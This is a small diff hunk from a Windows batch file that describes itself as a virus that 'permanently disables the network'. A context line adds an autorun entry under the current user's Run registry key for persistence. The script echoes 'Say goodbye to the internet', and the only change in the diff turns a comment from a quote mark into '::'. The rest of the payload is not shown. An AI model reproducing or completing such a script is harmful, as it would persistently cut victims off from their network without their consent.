@@ -7,4 +7,4 @@ reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexi
 echo Say goodbye to the internet
 PAUSE
 
-'this virus permamently disables the network
+::this virus permamently disables the network
